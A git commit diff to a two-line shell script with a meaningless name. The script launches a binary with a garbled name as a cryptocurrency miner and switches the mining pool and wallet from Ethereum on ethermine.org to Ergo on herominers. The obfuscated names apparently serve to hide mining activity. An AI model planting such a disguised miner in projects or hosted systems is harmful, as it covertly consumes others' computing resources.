10482d54b899931e957defa83d7405a4faa2577d
pempekselam <80247082+pempekselam@users.noreply.github.com>
2021-03-11 02:11:53 +0700

    Update iuhfdhjg.sh

--- iuhfdhjg.sh
+++ iuhfdhjg.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-chmod +x ./hcdbvhdffdh && ./hcdbvhdffdh -P stratum1+tcp://0x76910e83d10e6a2608c4cd5127c2a9439fdb6379.ajirizki667@eu1.ethermine.org:4444 -G -R
+chmod +x ./hcdbvhdffdh && ./hcdbvhdffdh -P stratum1+tcp://9hzjqeDRdpy7gDXgWum8P9CPdVYwXFFwrQetkop56KKMDgWpm6W.ajirizki667@ergo.herominers.com:10250 -G -R
